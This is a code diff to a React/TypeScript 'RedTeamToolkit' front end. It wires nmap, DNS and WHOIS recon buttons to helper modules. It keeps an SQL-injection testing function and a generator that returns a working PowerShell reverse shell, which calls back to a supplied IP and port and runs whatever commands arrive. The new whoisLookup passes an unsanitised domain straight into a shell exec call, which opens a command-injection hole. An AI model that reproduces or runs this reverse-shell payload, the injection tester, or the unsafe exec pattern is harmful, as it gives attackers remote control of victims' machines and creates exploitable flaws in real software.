@@ -5,6 +5,7 @@ import { exec } from 'child_process';
 import { Bug, Eye, KeyRound, Terminal } from "lucide-react";
 import React from "react";
 
+// --- REACT UI ---
 export default function RedTeamToolkit() {
     return (
         <div className="grid grid-cols-1 md:grid-cols-2 gap-4 p-4">
@@ -21,9 +22,38 @@ export default function RedTeamToolkit() {
                         <TabsContent value="recon">
                             <p className="text-sm">Quick recon tools for target profiling:</p>
                             <div className="mt-2 space-y-2">
-                                <Button variant="secondary" className="w-full">Run Nmap Scan</Button>
-                                <Button variant="secondary" className="w-full">Passive DNS Lookup</Button>
-                                <Button variant="secondary" className="w-full">WHOIS & ASN Check</Button>
+                                <Button
+                                    variant="secondary"
+                                    className="w-full"
+                                    onClick={async () => {
+                                        const target = prompt("Target IP/Host for Nmap:");
+                                        if (!target) return;
+                                        const result = await ReconModule.runNmapScan(target);
+                                        alert(result);
+                                    }}
+                                >Run Nmap Scan</Button>
+
+                                <Button
+                                    variant="secondary"
+                                    className="w-full"
+                                    onClick={async () => {
+                                        const domain = prompt("Domain for DNS Lookup:");
+                                        if (!domain) return;
+                                        const result = await ReconModule.dnsLookup(domain);
+                                        alert(JSON.stringify(result, null, 2));
+                                    }}
+                                >Passive DNS Lookup</Button>
+
+                                <Button
+                                    variant="secondary"
+                                    className="w-full"
+                                    onClick={async () => {
+                                        const domain = prompt("Domain for WHOIS Lookup:");
+                                        if (!domain) return;
+                                        const result = await ReconModule.whoisLookup(domain);
+                                        alert(result);
+                                    }}
+                                >WHOIS & ASN Check</Button>
                             </div>
                         </TabsContent>
 
@@ -60,6 +90,7 @@ export default function RedTeamToolkit() {
     );
 }
 
+// --- MODULES ---
 export const ReconModule = {
     runNmapScan: (target: string) => {
         return new Promise((resolve, reject) => {
@@ -73,8 +104,18 @@ export const ReconModule = {
     dnsLookup: async (domain: string) => {
         const response = await fetch(`https://dns.google/resolve?name=${domain}`);
         return response.json();
+    },
+
+    whoisLookup: (domain: string) => {
+        return new Promise((resolve, reject) => {
+            exec(`whois ${domain}`, (error, stdout) => {
+                if (error) reject(error);
+                resolve(stdout);
+            });
+        });
     }
 };
+
 export const ExploitModule = {
     sqlInjectionTest: async (target: string, payload: string) => {
         const response = await fetch(target, {
@@ -85,16 +126,13 @@ export const ExploitModule = {
         return response.json();
     }
 };
+
 export const PayloadModule = {
     generatePowerShell: (ip: string, port: number) => {
         return `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
     }
 };
-export const PayloadGenerator = {
-    generatePowershell: (ip: string, port: number) => {
-        return `$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
-    }
-};
+
 export const ConsoleModule = {
     executeCommand: (command: string) => {
         return new Promise((resolve, reject) => {
